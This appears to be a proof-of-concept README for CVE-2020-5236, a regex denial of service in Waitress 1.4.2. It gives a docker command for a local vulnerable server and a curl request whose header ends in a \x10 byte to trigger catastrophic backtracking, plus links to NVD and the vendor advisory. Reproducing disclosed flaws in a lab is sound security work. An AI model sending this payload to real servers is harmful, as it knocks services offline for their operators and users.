# Waitress 1.4.2 ReDoS - CVE-2020-5236

> Waitress version 1.4.2 allows a DOS attack When waitress receives a header that contains invalid characters. When a header like "Bad-header: xxxxxxxxxxxxxxx\x10" is received, it will cause the regular expression engine to catastrophically backtrack causing the process to use 100% CPU time and blocking any other interactions. This allows an attacker to send a single request with an invalid header and take the service offline.

  by NVD

## Using
### Run vulnerable server
```
$ docker run --rm --name waitress -v "$PWD/src:/src" -p "8080:8080" -it python:3.7-slim python /src/server.py
```


### PoC
```
$ curl "http://127.0.0.1:8080/hello/hogefuga" -H "Bad-header: xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx`echo -n '\x10'`"
```

Show cpu usage for server.  Exec "`docker stats waitress`".  
<img width="800" src="https://user-images.githubusercontent.com/3177297/73911334-08cc1000-48f5-11ea-8b3f-44b320422ef8.png">  
↓ Exec PoC  
<img width="800" src="https://user-images.githubusercontent.com/3177297/73911339-09fd3d00-48f5-11ea-9720-ba46492824d7.png">

## References
- [NVD - CVE-2020-5236](https://nvd.nist.gov/vuln/detail/CVE-2020-5236)
- [Catastrophic backtracking in regex allows Denial of Service · Advisory · Pylons/waitress](https://github.com/Pylons/waitress/security/advisories/GHSA-73m2-3pwg-5fgc)
